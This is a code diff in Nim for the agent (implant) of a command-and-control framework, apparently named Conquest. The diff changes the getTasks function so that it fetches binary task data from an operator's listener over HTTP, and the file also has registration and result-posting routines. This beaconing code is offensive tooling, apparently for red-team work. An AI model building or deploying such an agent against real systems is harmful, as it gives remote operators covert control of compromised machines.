@@ -1,6 +1,6 @@
 import httpclient, json, strformat, asyncdispatch
 
-import ./[types, agentinfo]
+import ./[types, utils, agentinfo]
 
 proc register*(config: AgentConfig): string = 
 
@@ -32,23 +32,24 @@ proc register*(config: AgentConfig): string =
     finally:
         client.close()
 
-proc getTasks*(config: AgentConfig, agent: string): seq[Task] = 
+proc getTasks*(config: AgentConfig, agent: string): string = 
 
-    # let client = newAsyncHttpClient()
-    # var responseBody = ""
+    let client = newAsyncHttpClient()
+    var responseBody = ""
 
-    # try:
-    #     # Register agent to the Conquest server
-    #     responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/tasks")
-    #     return parseJson(responseBody).to(seq[Task])
+    try:
+        # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
+        responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/tasks")
+        return responseBody
+    
+    except CatchableError as err:
+        # When the listener is not reachable, don't kill the application, but check in at the next time
+        echo "[-] [getTasks]: Listener not reachable."
+    
+    finally:
+        client.close()
 
-    # except CatchableError as err:
-    #     # When the listener is not reachable, don't kill the application, but check in at the next time
-    #     echo "[-] [getTasks]: ", responseBody
-    # finally:
-    #     client.close()
-
-    return @[]
+    return ""
 
 proc postResults*(config: AgentConfig, agent: string, taskResult: TaskResult): bool = 
     
